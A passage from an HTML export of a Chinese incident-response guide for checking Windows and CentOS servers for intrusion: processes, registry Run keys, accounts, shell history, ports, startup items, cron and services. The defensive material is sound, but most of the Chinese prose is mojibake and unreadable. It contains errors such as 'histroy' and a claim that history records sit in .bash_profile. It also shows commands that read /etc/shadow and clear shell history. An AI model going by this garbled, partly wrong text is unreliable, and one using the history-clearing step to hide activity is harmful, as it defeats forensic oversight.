<img src="./images/img_20230814_134338.png" alt="img_20230814_134338.png" width="60%"><br>

</figure>

<p>
<b>2ã€è¿›ç¨‹</b><br>
</p>

<p>
æ£€æŸ¥æ–¹æ³•ï¼šä¾æ®è¿›ç¨‹åç§°æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘è¿›ç¨‹ï¼Œæ¯”å¦‚6666.exeå¯èƒ½æ˜¯æœ¨é©¬ã€‚<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">tasklist /svc
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">C:\Users\jasper&gt;tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                       136 N/A
</pre>
</div>


<figure id="org05ef467">
<img src="./images/img_20230814_134844.png" alt="img_20230814_134844.png" width="60%"><br>

</figure>

<p>
aã€å¼€å§‹ &#x2013; è¿è¡Œ &#x2013; è¾“å…¥ msinfo32 å‘½ä»¤ï¼Œä¾æ¬¡ç‚¹å‡» "è½¯ä»¶ç¯å¢ƒ &#x2013; æ­£åœ¨è¿è¡Œä»»åŠ¡" å°±å¯ä»¥æŸ¥çœ‹åˆ°è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚è¿›ç¨‹è·¯å¾„ã€è¿›ç¨‹IDã€æ–‡ä»¶åˆ›å»ºæ—¥æœŸä»¥åŠå¯åŠ¨æ—¶é—´ç­‰ã€‚<br>
æ’æŸ¥æ–¹æ³•ï¼šå…³æ³¨ç‰ˆæœ¬ä¸ºä¸å¯ç”¨çš„æœåŠ¡<br>
</p>


<figure id="org5ef26f4">
<img src="./images/img_20230814_134917.png" alt="img_20230814_134917.png" width="60%"><br>

</figure>

<p>
bã€æ‰“å¼€Dç›¾_webæŸ¥æ€å·¥å…·ï¼Œè¿›ç¨‹æŸ¥çœ‹ï¼Œå…³æ³¨æ²¡æœ‰å¯ç–‘ä¿¡æ¯çš„è¿›ç¨‹<br>
</p>


<figure id="org3b56a04">
<img src="./images/img_20230814_135538.png" alt="img_20230814_135538.png" width="60%"><br>

</figure>

<p>
cã€é€šè¿‡å¾®è½¯å®˜æ–¹æä¾›çš„ Process Explorer ç­‰å·¥å…·è¿›è¡Œæ’æŸ¥<br>
</p>

<p>
å·¥å…·ä¸‹è½½åœ°å€ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a><br>
</p>


<figure id="org5fe1391">
<img src="./images/img_20230814_135603.png" alt="img_20230814_135603.png" width="60%"><br>

</figure>

<p>
dã€æŸ¥çœ‹å¯ç–‘çš„è¿›ç¨‹åŠå…¶å­è¿›ç¨‹<br>
å¯ä»¥é€šè¿‡è§‚å¯Ÿä»¥ä¸‹å†…å®¹<br>
</p>
<ul class="org-ul">
<li>æ²¡æœ‰ç­¾åéªŒè¯ä¿¡æ¯çš„è¿›ç¨‹<br></li>
<li>æ²¡æœ‰æè¿°ä¿¡æ¯çš„è¿›ç¨‹<br></li>
<li>è¿›ç¨‹çš„å±ä¸»<br></li>
<li>è¿›ç¨‹çš„è·¯å¾„æ˜¯å¦åˆæ³•<br></li>
<li>CPUæˆ–å†…å­˜èµ„æºå ç”¨é•¿æ—¶é—´è¿‡é«˜çš„è¿›ç¨‹ï¼ˆæ¯”å¦‚æŒ–çŸ¿ï¼‰<br></li>
</ul>

<p>
å¸¸ç”¨å‘½ä»¤ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#65289;&#26597;&#30475;&#31471;&#21475;&#23545;&#24212;&#30340; PID&#65306;netstat -ano | findstr <span style="color: #8b2252;">"port"</span>

2&#65289;&#26597;&#30475;&#36827;&#31243;&#23545;&#24212;&#30340; PID&#65306;&#20219;&#21153;&#31649;&#29702;&#22120; -- &#26597;&#30475; -- &#36873;&#25321;&#21015; -- PID &#25110;&#32773; tasklist | findstr <span style="color: #8b2252;">"PID"</span>

3&#65289;&#26597;&#30475;&#36827;&#31243;&#23545;&#24212;&#30340;&#31243;&#24207;&#20301;&#32622;&#65306;
   &#20219;&#21153;&#31649;&#29702;&#22120; -- &#36873;&#25321;&#23545;&#24212;&#36827;&#31243; -- &#21491;&#38190;&#25171;&#24320;&#25991;&#20214;&#20301;&#32622;
   &#36816;&#34892;&#36755;&#20837;wmic&#65292;cmd &#30028;&#38754;&#36755;&#20837; process

4&#65289;tasklist /svc &#36827;&#31243; -- PID -- &#26381;&#21153;

5&#65289;&#26597;&#30475;Windows&#26381;&#21153;&#25152;&#23545;&#24212;&#30340;&#31471;&#21475;&#65306;
   %systemroot%/system32/drivers/etc/services&#65288;&#19968;&#33324; %systemroot% &#23601;&#26159; C:\Windows &#36335; &#24452;&#65289;
</pre>
</div>
</div>
</div>
<div id="outline-container-org6829ec1" class="outline-4">
<h4 id="org6829ec1">æ£€æŸ¥å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡</h4>
<div class="outline-text-4" id="text-org6829ec1">
<p>
<b>æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æœ‰å¼‚å¸¸çš„å¯åŠ¨é¡¹</b><br>
</p>

<p>
æ£€æŸ¥æ–¹æ³•ï¼š<br>
</p>
<ul class="org-ul">
<li>ç™»å½•æœåŠ¡å™¨ï¼Œå•å‡»ã€å¼€å§‹ã€‘&gt;ã€æ‰€æœ‰ç¨‹åºã€‘&gt;ã€å¯åŠ¨ã€‘ï¼Œé»˜è®¤æƒ…å†µä¸‹æ­¤ç›®å½•åœ¨æ˜¯ä¸€ä¸ªç©ºç›®å½•ï¼Œç¡®è®¤æ˜¯å¦æœ‰éä¸šåŠ¡ç¨‹åºåœ¨è¯¥ç›®å½•ä¸‹ã€‚<br></li>
<li>å•å‡»å¼€å§‹èœå• &gt;ã€è¿è¡Œã€‘ï¼Œè¾“å…¥ msconfig ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œæ˜¯åˆ™å–æ¶ˆå‹¾é€‰å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œå¹¶åˆ°å‘½ä»¤ä¸­æ˜¾ç¤ºçš„è·¯å¾„åˆ é™¤æ–‡ä»¶ã€‚<br></li>
<li><p>
å•å‡»ã€å¼€å§‹ã€‘&gt;ã€è¿è¡Œã€‘ï¼Œè¾“å…¥ regeditï¼Œæ‰“å¼€æ³¨å†Œè¡¨ï¼ŒæŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹æ˜¯å¦æ­£å¸¸ï¼Œç‰¹åˆ«æ³¨æ„å¦‚ä¸‹ä¸‰ä¸ªæ³¨å†Œè¡¨é¡¹ï¼š<br>
æ£€æŸ¥å³ä¾§æ˜¯å¦æœ‰å¯åŠ¨å¼‚å¸¸çš„é¡¹ç›®ï¼Œå¦‚æœ‰è¯·åˆ é™¤ï¼Œå¹¶å»ºè®®å®‰è£…æ€æ¯’è½¯ä»¶è¿›è¡Œç—…æ¯’æŸ¥æ€ï¼Œæ¸…é™¤æ®‹ç•™ç—…æ¯’æˆ–æœ¨é©¬ã€‚<br>
æ³¨å†Œè¡¨çš„ä½œç”¨ï¼šwindowsä¼šæŠŠå®ƒçš„é…ç½®ä¿¡æ¯å­˜å‚¨åœ¨æ³¨å†Œè¡¨çš„æ•°æ®åº“é‡Œï¼Œæ³¨å†Œè¡¨å°±åŒ…å«äº†è®¡ç®—æœºä¸­æ¯ä¸ªç”¨æˆ·çš„ä¸€äº›é…ç½®æ–‡ä»¶ã€ç³»ç»Ÿçš„ç¡¬ä»¶ä¿¡æ¯ã€å®‰è£…ç¨‹åºä»¥åŠå±æ€§è®¾ç½®ç­‰ç­‰ï¼Œwindowsåœ¨æ“ä½œè¿‡ç¨‹å½“ä¸­ä¼šä¸æ–­çš„å»å¼•ç”¨è¿™äº›ä¿¡æ¯ã€‚æ‰€ä»¥æ³¨å†Œè¡¨ä¹Ÿæ˜¯æ”»å‡»è€…å–œæ¬¢æ”»å‡»çš„ä¸€ä¸ªç›®æ ‡ã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce
</pre>
</div></li>
<li>åˆ©ç”¨å®‰å…¨è½¯ä»¶æŸ¥çœ‹å¯åŠ¨é¡¹ã€å¼€æœºæ—¶é—´ç®¡ç†ç­‰ã€‚<br></li>
<li>ç»„ç­–ç•¥ï¼Œè¿è¡Œ gpedit.msc<br>
<ul class="org-ul">
<li>è®¡ç®—æœºé…ç½®ä¸­æ‰¾åˆ° Windows è®¾ç½®ï¼Œåœ¨"è„šæœ¬(å¯åŠ¨/å…³æœº)"ä¸­æŸ¥çœ‹å¯åŠ¨é…ç½®æ˜¯å¦æœ‰å¯ç–‘è„šæœ¬<br>
ç»„ç­–ç•¥çš„ä½œç”¨ï¼šå®ƒæä¾›äº†æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºä»¥åŠä¸€äº›æ´»åŠ¨ç›®å½•å½“ä¸­ç”¨æˆ·è®¾ç½®çš„é›†ä¸­åŒ–çš„ç®¡ç†å’Œé…ç½®ï¼Œå¯ä»¥æ§åˆ¶ç”¨æˆ·è´¦æˆ·ä»¥åŠè®¡ç®—æœºè´¦æˆ·çš„ä¸€äº›å·¥ä½œç¯å¢ƒã€‚<br></li>
</ul></li>
</ul>


<figure id="orgc56c4e8">
<img src="./images/img_20230814_141546.png" alt="img_20230814_141546.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-org2e69e2b" class="outline-3">
<h3 id="org2e69e2b">Linuxå…¥ä¾µæ’æŸ¥</h3>
<div class="outline-text-3" id="text-org2e69e2b">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šCentOS</b><br>
</p>

<p>
é’ˆå¯¹å¸¸è§çš„æ”»å‡»äº‹ä»¶ï¼Œç»“åˆå·¥ä½œä¸­åº”æ€¥å“åº”äº‹ä»¶åˆ†æå’Œè§£å†³çš„æ–¹æ³•ï¼Œå¸¸è§ Linux æœåŠ¡å™¨å…¥ä¾µæ’æŸ¥çš„æ€è·¯å¦‚ä¸‹ã€‚<br>
</p>
</div>
<div id="outline-container-orgbe47030" class="outline-4">
<h4 id="orgbe47030">è´¦å·å®‰å…¨</h4>
<div class="outline-text-4" id="text-orgbe47030">
<p>
<b>åŸºæœ¬ä½¿ç”¨</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#29992;&#25143;&#20449;&#24687;&#25991;&#20214;/etc/passwd
root:x:0:0:root:/root:/bin/bash

account:password:UID:GID:GECOS:directory:shell
&#29992;&#25143;&#21517;&#65306;&#23494;&#30721;&#65306;&#29992;&#25143;ID&#65306;&#32452;ID&#65306;&#29992;&#25143;&#35828;&#26126;&#65306;&#23478;&#30446;&#24405;&#65306;&#30331;&#38470;&#20043;&#21518;&#30340;shell &#27880;&#24847;&#65306;&#26080;&#23494;&#30721;&#21482;&#20801;&#35768;&#26412;&#26426;&#30331;&#38470;&#65292;&#36828;&#31243;&#19981;&#20801;&#35768;&#30331;&#38470;

2&#12289;&#24433;&#23376;&#25991;&#20214; /etc/shadow
root:$<span style="color: #a0522d;">6</span>$<span style="color: #a0522d;">oGs1PqhL2p3ZetrE</span>$<span style="color: #a0522d;">X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft 7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::

&#29992;&#25143;&#21517;&#65306;&#21152;&#23494;&#23494;&#30721;&#65306;&#26368;&#21518;&#19968;&#27425;&#20462;&#25913;&#26102;&#38388;&#65306;&#26368;&#23567;&#20462;&#25913;&#26102;&#38388;&#38388;&#38548;&#65306;&#23494;&#30721;&#26377;&#25928;&#26399;&#65306;&#23494;&#30721;&#38656;&#35201;&#21464;&#26356;&#21069;&#30340;&#35686;&#21578;&#22825;&#25968;&#65306;&#23494;&#30721; &#36807;&#26399;&#21518;&#30340;&#23485;&#38480;&#26102;&#38388;&#65306;&#36134;&#21495;&#22833;&#25928;&#26102;&#38388;&#65306;&#20445;&#30041;&#23383;&#27573;

&#31995;&#32479;&#29992;&#25143;&#26159;&#19981;&#33021;&#30331;&#24405;&#30340;&#65292;&#23494;&#30721;&#23383;&#27573;&#20026;&#26143;&#21495;&#65288;*&#65289;&#65307;
&#20004;&#20010;&#24863;&#21497;&#21495;&#65288;!!&#65289;&#34920;&#31034;&#36825;&#20010;&#29992;&#25143;&#34987;&#38145;&#23450;&#20102;&#65292;&#26080;&#27861;&#30331;&#24405;&#65307;
&#32654;&#20803;&#31526;&#21495;&#65288;$&#65289;&#20986;&#29616;&#22312;&#21152;&#23494;&#26684;&#24335;&#30340;&#23494;&#30721;&#37324;&#65292;&#36215;&#21040;&#20998;&#38548;&#20316;&#29992;&#65307;

&#30001;&#19977;&#37096;&#20998;&#32452;&#25104;&#30340;&#65292;&#20197;$<span style="color: #a0522d;">&#20998;&#38548;</span>&#65292;&#21363;&#65306;$<span style="color: #a0522d;">id</span>$<span style="color: #a0522d;">salt</span>$<span style="color: #a0522d;">encrypted</span>  $<span style="color: #a0522d;">&#25968;&#23383;</span>$<span style="color: #a0522d;">&#38543;&#26426;&#25968;</span>$<span style="color: #a0522d;">&#21152;&#23494;&#21518;&#30340;&#23494;&#30721;&#20018;</span>&#65307;&#31532;3&#20010; $ &#20998;&#38548;&#30340;&#25165;&#26159;&#30495;&#27491;&#30340;&#23494;&#30721;&#20018;&#65307;id&#34920;&#31034;&#21152;&#23494;&#31639;&#27861;&#65292;&#24403;id&#20026;1&#26102;&#65292;&#20351;&#29992;md5&#21152;&#23494;&#65292;&#20197;&#27492;&#31867;&#25512;&#65292;id&#20026;6&#37319;&#29992;SHA512&#36827;&#34892;&#21152;&#23494;&#12290;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">who &#26597;&#30475;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;&#65288;tty &#26412;&#22320;&#30331;&#38470; pts &#36828;&#31243;&#30331;&#24405;&#65289;

w &#26597;&#30475;&#31995;&#32479;&#20449;&#24687;&#65292;&#24819;&#30693;&#36947;&#26576;&#19968;&#26102;&#21051;&#29992;&#25143;&#30340;&#34892;&#20026;

uptime &#26597;&#30475;&#30331;&#38470;&#22810;&#20037;&#12289;&#22810;&#23569;&#29992;&#25143;&#65292;&#36127;&#36733;&#29366;&#24577;
</pre>
</div>

<p>
<b>å…¥ä¾µæ’æŸ¥</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#65289;&#26597;&#35810;&#29305;&#26435;&#29992;&#25143;(uid&#20026;0)
awk -F: <span style="color: #8b2252;">'$3==0{print $1}'</span> /etc/passwd

2&#65289;&#26597;&#35810;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;
awk <span style="color: #8b2252;">'/\$1|\$6/{print $1}'</span> /etc/shadow

3&#65289;&#38500;root&#36134;&#21495;&#22806;&#65292;&#20854;&#20182;&#36134;&#21495;&#26159;&#21542;&#23384;&#22312;sudo&#26435;&#38480;&#12290;&#22914;&#38750;&#31649;&#29702;&#38656;&#35201;&#65292;&#26222;&#36890;&#36134;&#21495;&#24212;&#21024;&#38500;sudo&#26435;&#38480;
more /etc/sudoers | grep -v <span style="color: #8b2252;">"^#\|^$"</span> | grep <span style="color: #8b2252;">"ALL=(ALL)"</span>

4&#65289;&#31105;&#29992;&#25110;&#21024;&#38500;&#22810;&#20313;&#21450;&#21487;&#30097;&#30340;&#36134;&#21495;
usermod -L user &#31105;&#29992;&#36134;&#21495;&#65292;&#36134;&#21495;&#26080;&#27861;&#30331;&#24405;&#65292;/etc/shadow &#31532;&#20108;&#26639;&#20026; ! &#24320;&#22836;
userdel user &#21024;&#38500; user &#29992;&#25143;
userdel -r user &#23558;&#21024;&#38500; user &#29992;&#25143;&#65292;&#24182;&#19988;&#23558; /home &#30446;&#24405;&#19979;&#30340; user &#30446;&#24405;&#19968;&#24182;&#21024;&#38500;
</pre>
</div>
</div>
</div>
<div id="outline-container-org3737f85" class="outline-4">
<h4 id="org3737f85">å†å²å‘½ä»¤</h4>
<div class="outline-text-4" id="text-org3737f85">
<p>
<b>åŸºæœ¬ä½¿ç”¨</b><br>
é€šè¿‡ .bash_history æ–‡ä»¶æŸ¥çœ‹è´¦å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;root&#29992;&#25143;&#30340;&#21382;&#21490;&#21629;&#20196;
histroy

2&#12289;&#25171;&#24320; /home &#21508;&#36134;&#21495;&#30446;&#24405;&#19979;&#30340; .bash_history&#65292;&#26597;&#30475;&#26222;&#36890;&#36134;&#21495;&#25191;&#34892;&#30340;&#21382;&#21490;&#21629;&#20196;&#12290;

3&#12289;&#21382;&#21490;&#25805;&#20316;&#21629;&#20196;&#30340;&#28165;&#38500;&#65306;history -c
&#20294;&#27492;&#21629;&#20196;&#24182;&#19981;&#20250;&#28165;&#38500;&#20445;&#23384;&#22312;&#25991;&#20214;&#20013;&#30340;&#35760;&#24405;&#65292;&#22240;&#27492;&#38656;&#35201;&#25163;&#21160;&#21024;&#38500; .bash_profile &#25991;&#20214;&#20013;&#30340;&#35760;&#24405;&#12290;
</pre>
</div>

<p>
<b>å…¥ä¾µæ’æŸ¥</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#36827;&#20837;&#29992;&#25143;&#30446;&#24405;&#19979;&#65292;&#23548;&#20986;&#21382;&#21490;&#21629;&#20196;
cat .bash_history &gt;&gt; history.txt
</pre>
</div>
</div>
</div>
<div id="outline-container-orgea45f27" class="outline-4">
<h4 id="orgea45f27">æ£€æŸ¥å¼‚å¸¸ç«¯å£</h4>
<div class="outline-text-4" id="text-orgea45f27">
<p>
ä½¿ç”¨ netstat ç½‘ç»œè¿æ¥å‘½ä»¤ï¼Œåˆ†æå¯ç–‘ç«¯å£ã€IPã€PID<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">netstat -antlp

&#26597;&#30475; pid &#25152;&#23545;&#24212;&#30340;&#36827;&#31243;&#25991;&#20214;&#36335;&#24452;:
&#36816;&#34892; ls -l /proc/$<span style="color: #a0522d;">PID</span>/exe &#25110; file /proc/$<span style="color: #a0522d;">PID</span>/exe&#65288;$<span style="color: #a0522d;">PID</span> &#20026;&#23545;&#24212;&#30340; pid &#21495;&#65289;
</pre>
</div>
</div>
</div>
<div id="outline-container-orgd7319db" class="outline-4">
<h4 id="orgd7319db">æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹</h4>
<div class="outline-text-4" id="text-orgd7319db">
<p>
ä½¿ç”¨ ps å‘½ä»¤ï¼Œåˆ†æè¿›ç¨‹<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">ps aux | grep pid
</pre>
</div>
</div>
</div>
<div id="outline-container-org952dbb4" class="outline-4">
<h4 id="org952dbb4">æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹</h4>
<div class="outline-text-4" id="text-org952dbb4">
<p>
<b>åŸºæœ¬ä½¿ç”¨</b><br>
</p>

<p>
Linuxç³»ç»Ÿæœ‰7ä¸ªç³»ç»Ÿè¿è¡Œçº§åˆ«ï¼ˆrunlevelï¼‰:<br>
</p>
<ul class="org-ul">
<li>è¿è¡Œçº§åˆ«0ï¼šç³»ç»ŸåœæœºçŠ¶æ€ï¼Œç³»ç»Ÿé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º0ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨<br></li>
<li>è¿è¡Œçº§åˆ«1ï¼šå•ç”¨æˆ·å·¥ä½œçŠ¶æ€ï¼Œrootæƒé™ï¼Œç”¨äºç³»ç»Ÿç»´æŠ¤ï¼Œç¦æ­¢è¿œç¨‹ç™»é™†<br></li>
<li>è¿è¡Œçº§åˆ«2ï¼šå¤šç”¨æˆ·çŠ¶æ€(æ²¡æœ‰NFS)<br></li>
<li>è¿è¡Œçº§åˆ«3ï¼šå®Œå…¨çš„å¤šç”¨æˆ·çŠ¶æ€(æœ‰NFS)ï¼Œç™»é™†åè¿›å…¥æ§åˆ¶å°å‘½ä»¤è¡Œæ¨¡å¼<br></li>
<li>è¿è¡Œçº§åˆ«4ï¼šç³»ç»Ÿæœªä½¿ç”¨ï¼Œä¿ç•™<br></li>
<li>è¿è¡Œçº§åˆ«5ï¼šX11æ§åˆ¶å°ï¼Œç™»é™†åè¿›å…¥å›¾å½¢GUIæ¨¡å¼<br></li>
<li>è¿è¡Œçº§åˆ«6ï¼šç³»ç»Ÿæ­£å¸¸å…³é—­å¹¶é‡å¯ï¼Œé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º6ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">&#36816;&#34892;&#32423;&#21035; &#21547;&#20041;
0 &#20851;&#26426;
1 &#21333;&#29992;&#25143;&#27169;&#24335;&#65292;&#21487;&#20197;&#24819;&#35937;&#20026;windows&#30340;&#23433;&#20840;&#27169;&#24335;&#65292;&#20027;&#35201;&#29992;&#20110;&#31995;&#32479;&#20462;&#22797;
2 &#19981;&#23436;&#20840;&#30340;&#21629;&#20196;&#34892;&#27169;&#24335;&#65292;&#19981;&#21547;NFS&#26381;&#21153;
3 &#23436;&#20840;&#30340;&#21629;&#20196;&#34892;&#27169;&#24335;&#65292;&#23601;&#26159;&#26631;&#20934;&#23383;&#31526;&#30028;&#38754;
4 &#31995;&#32479;&#20445;&#30041;
5 &#22270;&#24418;&#27169;&#24335;
6 &#37325;&#21551;&#21160;
</pre>
</div>

<p>
æŸ¥çœ‹è¿è¡Œçº§åˆ«å‘½ä»¤: <code>runlevel</code><br>
å¼€æœºå¯åŠ¨é…ç½®æ–‡ä»¶: /etc/rc.d/rc.local /etc/rc.d/rc[0~6].d<br>
</p>

<p>
chkconfig å‘½ä»¤ç”¨äºæ£€æŸ¥ï¼Œè®¾ç½®ç³»ç»Ÿçš„å„ç§æœåŠ¡<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">chkconfig --list [name] //&#26381;&#21153;&#21015;&#34920;[&#21487;&#26681;&#25454;&#23454;&#38469;&#38656;&#35201;&#65292;&#20572;&#25481;&#19981;&#29992;&#26381;&#21153;]
chkconfig --add [name] //&#26381;&#21153;&#28155;&#21152;[&#22914;&#32570;&#30465;&#65292;&#21017;&#20174;&#32570;&#30465;&#30340;init&#33050;&#26412;&#33258;&#21160;&#24314;&#31435;]
chkconfig --del [name] //&#26381;&#21153;&#21024;&#38500;[&#24182;&#25226;&#30456;&#20851;&#31526;&#21495;&#36830;&#25509;&#20174;/etc/rc[0-6].d&#21024;&#38500;]
</pre>
</div>

<p>
å½“æˆ‘ä»¬éœ€è¦è®¾ç½®å¼€æœºå¯åŠ¨çš„è„šæœ¬æ—¶ï¼Œåªéœ€è¦å°†å¯æ‰§è¡Œè„šæœ¬æ”¾åœ¨ /etc/init.d ç›®å½•ä¸‹ï¼Œç„¶ååœ¨/etc/rc.d/rc*.d ç›®å½•ä¸‹å»ºç«‹è½¯é“¾æ¥å³å¯ã€‚<br>
æ³¨ï¼šæ­¤ä¸­çš„ * ä»£è¡¨ 0,1,2,3,4,5,6 è¿™ä¸ƒä¸ªç­‰çº§<br>
</p>

<p>
<b>å…¥ä¾µæ’æŸ¥</b><br>
</p>

<p>
å¯åŠ¨é¡¹æ–‡ä»¶ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">/etc/rc.d/rc.local
/etc/rc.d/rc[0~6].d

ls -l /etc/rc.d/rc3.d/
</pre>
</div>
</div>
</div>
<div id="outline-container-org618012c" class="outline-4">
<h4 id="org618012c">æ£€æŸ¥å®šæ—¶ä»»åŠ¡</h4>
<div class="outline-text-4" id="text-org618012c">
<p>
<b>åŸºæœ¬ä½¿ç”¨</b><br>
</p>

<p>
1ã€åˆ©ç”¨ crontab åˆ›å»ºè®¡åˆ’ä»»åŠ¡<br>
åŸºæœ¬å‘½ä»¤<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">crontab -l &#21015;&#20986;&#26576;&#20010;&#29992;&#25143;cron&#26381;&#21153;&#30340;&#35814;&#32454;&#20869;&#23481;
Tips&#65306;&#40664;&#35748;&#32534;&#20889;&#30340;crontab&#25991;&#20214;&#20250;&#20445;&#23384;&#22312; /var/spool/cron/&#29992;&#25143;&#21517; &#20363;&#22914;: /var/spool/cron/root

crontab -r &#21024;&#38500;&#27599;&#20010;&#29992;&#25143;cron&#20219;&#21153;(&#35880;&#24910;&#65306;&#21024;&#38500;&#25152;&#26377;&#30340;&#35745;&#21010;&#20219;&#21153;)

crontab -e &#20351;&#29992;&#32534;&#36753;&#22120;&#32534;&#36753;&#24403;&#21069;&#30340;crontab&#25991;&#20214; &#22914;&#65306;
*/1 * * * * echo <span style="color: #8b2252;">"hello world"</span> &gt;&gt; /tmp/test.txt <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27599;&#20998;&#38047;&#20889;&#20837;&#25991;&#20214;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26143;&#21495;&#20195;&#34920;&#20998;&#26102;&#26085;&#26376;&#21608;</span>
</pre>
</div>

<p>
2ã€åˆ©ç”¨ anacron å‘½ä»¤å®ç°å¼‚æ­¥å®šæ—¶ä»»åŠ¡è°ƒåº¦<br>
</p>

<p>
<b>å…¥ä¾µæ’æŸ¥</b><br>
é‡ç‚¹å…³æ³¨ä»¥ä¸‹ç›®å½•ä¸­æ˜¯å¦å­˜åœ¨æ¶æ„è„šæœ¬<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">/var/spool/cron/*
/etc/crontab
/etc/cron.d/*
/etc/cron.daily/*
/etc/cron.hourly/*
/etc/cron.monthly/*
/etc/cron.weekly/
/etc/anacrontab
/var/spool/anacron/*
</pre>
</div>
</div>
</div>
<div id="outline-container-org2e559b0" class="outline-4">
<h4 id="org2e559b0">æ£€æŸ¥æœåŠ¡</h4>
<div class="outline-text-4" id="text-org2e559b0">
<p>
<b>æœåŠ¡è‡ªå¯åŠ¨</b><br>
</p>

<p>
ç¬¬ä¸€ç§ä¿®æ”¹æ–¹æ³•ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">chkconfig [--level &#36816;&#34892;&#32423;&#21035;] [&#29420;&#31435;&#26381;&#21153;&#21517;] [on|off]
chkconfig &#8211;-level 2345 httpd on &#24320;&#21551;&#33258;&#21551;&#21160;
chkconfig httpd on &#65288;&#40664;&#35748;level&#26159;2345&#65289;
</pre>
</div>

<p>
ç¬¬äºŒç§ä¿®æ”¹æ–¹æ³•ï¼š<br>
ä¿®æ”¹ /etc/rc.d/rc.local æ–‡ä»¶ï¼ŒåŠ å…¥ /etc/init.d/httpd start<br>
</p>

<p>
<b>å…¥ä¾µæ’æŸ¥</b><br>
</p>

<p>
æŸ¥è¯¢å·²å®‰è£…çš„æœåŠ¡ï¼š<br>
RPMåŒ…å®‰è£…çš„æœåŠ¡<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">
chkconfig --list &#26597;&#30475;&#26381;&#21153;&#33258;&#21551;&#21160;&#29366;&#24577;&#65292;&#21487;&#20197;&#30475;&#21040;&#25152;&#26377;&#30340;RPM&#21253;&#23433;&#35013;&#30340;&#26381;&#21153;
ps aux | grep crond &#26597;&#30475;&#24403;&#21069;&#26381;&#21153;

&#26597;&#30475;&#31995;&#32479;&#22312;3&#19982;5&#32423;&#21035;&#19979;&#30340;&#21551;&#21160;&#39033;
&#20013;&#25991;&#29615;&#22659;
chkconfig --list | grep <span style="color: #8b2252;">"3:&#21551;&#29992;\|5:&#21551;&#29992;"</span>
&#33521;&#25991;&#29615;&#22659;
chkconfig --list | grep <span style="color: #8b2252;">"3:on\|5:on"</span>
</pre>
</div>

<p>
æºç åŒ…å®‰è£…çš„æœåŠ¡<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#28304;&#30721;&#21253;&#26381;&#21153;&#30340;&#21551;&#21160;&#31649;&#29702;&#65306;/usr/local/
&#28304;&#30721;&#21253;&#26381;&#21153;&#30340;&#33258;&#21551;&#21160;&#31649;&#29702;&#65306;/etc/rc.d/init.d/
</pre>
</div>
</div>
</div>
<div id="outline-container-org0881656" class="outline-4">
<h4 id="org0881656">æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶</h4>
<div class="outline-text-4" id="text-org0881656">
<p>
1ã€æŸ¥çœ‹æ•æ„Ÿç›®å½•ï¼Œå¦‚/tmpç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ŒåŒæ—¶æ³¨æ„éšè—æ–‡ä»¶å¤¹ï¼Œä»¥â€œ..â€ä¸ºåçš„æ–‡ä»¶å¤¹å…·æœ‰éšè—å±æ€§ã€‚<br>
2ã€é’ˆå¯¹å¯ç–‘æ–‡ä»¶å¯ä»¥ä½¿ç”¨ stat æŸ¥çœ‹åˆ›å»ºä¿®æ”¹æ—¶é—´ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org8f4e8fc" class="outline-4">
<h4 id="org8f4e8fc">æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—</h4>
